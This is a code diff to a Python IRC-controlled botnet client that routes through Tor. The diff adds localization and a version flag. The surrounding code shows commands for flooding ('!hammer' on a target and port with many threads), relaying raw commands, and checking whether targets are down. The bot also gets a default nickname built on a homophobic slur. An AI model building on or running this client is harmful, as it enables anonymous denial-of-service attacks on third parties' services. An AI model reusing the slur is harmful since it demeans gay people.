@@ -14,6 +14,7 @@ import socks
 import socket
 import ssl
 import os
+import sys
 import time
 import random
 import thread
@@ -79,12 +80,33 @@ port = None
 config = {}
 execfile("configuration.conf", config)
 
+# Language
+
+language = config["language"]
+lang = {}
+try:
+    execfile("locales/" + language + ".lang", lang)
+except Exception as e:
+    fail("Incorrect language in configuration.conf!")
+    print(e)
+
+# Version
+
+version = "0.1.9"
+
 # Argparse
 
 parser = argparse.ArgumentParser()
 parser.add_argument("--port", "-p",
                     help="SOCKS5 port")
+parser.add_argument("--version", "-v",
+                    help="Script version",
+                    action="store_true")
 args = parser.parse_args()
+
+if args.version:
+    okblue(lang["cmversion"] + version)
+    sys.exit()
 
 # Classes & Threading
 
@@ -95,15 +117,13 @@ class hammer(threading.Thread):
 okblue(art)
 time.sleep(1)
 
-version = "0.1.8"
-
 print(bcolors.HEADER + "~~ Built up on TorBot. Special thanks to Leet for this awesome code which is so easy to work with. <33333" + bcolors.ENDC)
 okblue("v" + version + " see: https://github.com/ClaudiaDAnon/ClaudiaMIND")
 
 if(platform.system()=="Windows"):
-    sport = args.port if args.port else raw_input("SOCKS5 port (def. 9150): ")
+    sport = args.port if args.port else raw_input(lang["socksport"] + " (" + lang["defscport"] + str(9150) + "): ")
 else:
-    sport = args.port if args.port else raw_input("SOCKS5 port (def. 9050): ")
+    sport = args.port if args.port else raw_input(lang["socksport"] + " (" + lang["defscport"] + str(9050) + "): ")
 
 if sport == "":
     sport = 9050
@@ -113,17 +133,17 @@ else:
     sport = int(sport)
 
 
-native_ip = "0"
+native_ip = config["native_ip"]
 
 if native_ip == "0":
-    warning("You might want to set your native IP inside the file in order to make this process shorter.")
+    warning(lang["unativeip"])
     time.sleep(2)
     if(platform.system()=="Windows"):
         native_ip = str(urllib2.urlopen("http://canihazip.com/s").read())
     else:
         native_ip = requests.get("http://canihazip.com/s").text
 
-print("Your native IP: " + native_ip)
+print(lang["ynativeip"] + native_ip)
 
 # Tor
 socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", sport, True)
@@ -137,10 +157,10 @@ else:
 
 if IP == native_ip:
     IP = 0
-    fail("Detected IP leaks.")
+    fail(lang["yoipleaks"])
     time.sleep(2)
 else:
-    okgreen("No IP leaks detected.")
+    okgreen(lang["noipleaks"])
     time.sleep(1)
 
 okblue("IP: " + IP)
@@ -152,7 +172,7 @@ if nickname ==  "":
     nickname = "faggot" + str(int(random.random() * 1000))
 else:
     nickname = nickname + str(int(random.random() * 1000))
-print("If you want a better nickname than " + bcolors.FAIL + nickname + bcolors.ENDC + ", then set it inside the file.")
+print(lang["bettrname"] + bcolors.FAIL + nickname + bcolors.ENDC + lang["setinfile"])
 username = nickname
 realname = nickname
 ircd = config["ircd"]
@@ -177,7 +197,7 @@ try:
     s = ssl.wrap_socket(s)
     
 except Exception as e:
-    fail("Failed to connect. Is TOR running? [" + str(sport) + "]")
+    fail(lang["confailed"] + "[" + str(sport) + "]")
     print(e)
     exit()
 
@@ -189,12 +209,23 @@ s.send("USER " + username + " 0 * :" + realname + "\r\n")
 # Message-sending 
 def message(msg):
     s.send("PRIVMSG " + channel + " :" + msg + "\r\n")
-    print(bcolors.OKGREEN + nickname+" (you): " + bcolors.ENDC + msg)
+    if msg == "Stopping the attack":
+        print(bcolors.OKGREEN + nickname+" ("+lang["senderyou"]+"): " + bcolors.ENDC + lang["stopattck"])
+    elif "is up for me." in msg:
+        print(bcolors.OKGREEN + nickname+" ("+lang["senderyou"]+"): " + bcolors.ENDC + lang["isupforme"])
+    elif "is down for me." in msg:
+        print(bcolors.OKGREEN + nickname+" ("+lang["senderyou"]+"): " + bcolors.ENDC + lang["isdownfme"])
+    elif "Going with minimum threads" in msg:
+        print(bcolors.OKGREEN + nickname+" ("+lang["senderyou"]+"): " + bcolors.ENDC + lang["minthread"])
+    elif "Going with maximum threads" in msg:
+        print(bcolors.OKGREEN + nickname+" ("+lang["senderyou"]+"): " + bcolors.ENDC + lang["maxthread"])
+    else:
+        print(bcolors.OKGREEN + nickname+" ("+lang["senderyou"]+"): " + bcolors.ENDC + msg)
 
 # Private-Messaging
 def privmessage(user2, msg):
     s.send(":source PRIVMSG " + user2 + " :" + msg + "\r\n")
-    print(bcolors.OKGREEN + nickname+" (you) --> " + user2 + ": " + bcolors.ENDC + msg)
+    print(bcolors.OKGREEN + nickname+" ("+lang["senderyou"]+") --> " + user2 + ": " + bcolors.ENDC + msg)
 
     
 # Wait for ping from server
@@ -251,7 +282,10 @@ while 1:
 
     #print "recvd: " + recvd
     #print "<%r> %r" % (senderuser, sentmessage)
-    print bcolors.OKBLUE + "<" + senderuser + "> " + bcolors.ENDC + sentmessage 
+    if nickname in sentmessage:
+        print bcolors.OKGREEN + "<" + senderuser + "> " + sentmessage + bcolors.ENDC 
+    else:
+        print bcolors.OKBLUE + "<" + senderuser + "> " + bcolors.ENDC + sentmessage 
     if "PING :" in recvd:
         recvd = recvd.strip("PING :")
         pong = "PONG : " + recvd
@@ -275,7 +309,6 @@ while 1:
             time.sleep(1)
             message("Testing: v" + version)
             s.send("PRIVMSG " + senderuser + " :" + IP + " @" + version + "\r\n")
-            print(senderuser)
         if "!hammer" in sentmessage:
             if target is None:
                 attackdata = sentmessage.replace("!hammer ", "")
@@ -287,17 +320,15 @@ while 1:
                     if threads < maxthreads:
                         if threads < minthreads:
                             threads = minthreads
-                            print("Going with minimum threads (" + str(threads) + ")")
                             message("Going with minimum threads (" + str(threads) + ")")
                     else:
                         threads = maxthreads
-                        print("Going with maximum threads (" + str(threads) + ")")
                         message("Going with maximum threads (" + str(threads) + ")")
                     port = int(port)
                     attack_hammer = hammer()
                     hammer.start(attack_hammer)
                 except Exception as e:
-                    fail("Incorrect !hammer format.")
+                    fail(lang["incorrect"] + "!hammer" + lang["incformat"])
                     message("Incorrect !hammer format.")
                     print(e)
         if "!command" in sentmessage:
@@ -307,7 +338,7 @@ while 1:
                 if result[0][0] == nickname or result[0][0] == "*":
                     s.send(result[0][1] + "\r\n")
             except Exception as e:
-                fail("Incorrect !command format.")
+                fail(lang["incorrect"] + "!command" + lang["incformat"])
                 message("Incorrect !command format.")
                 print(e)
         if "!ping" in sentmessage:
@@ -320,7 +351,7 @@ while 1:
                     else:
                         message(pingdata + " is down for me.")
                 except Exception as e:
-                    fail("Incorrect !ping format.")
+                    fail(lang["incorrect"] + "!ping" + lang["incformat"])
                     message("Incorrect !ping format.")
                     print(e)
         if sentmessage == "!stop":
@@ -329,5 +360,5 @@ while 1:
             target = None
             threads = None
             port = None
-        if "ACTION pets "+nickname in sentmessage:
+        if ("ACTION pets "+nickname in sentmessage) or ("ACTION pets *" in sentmessage):
             message("purr")
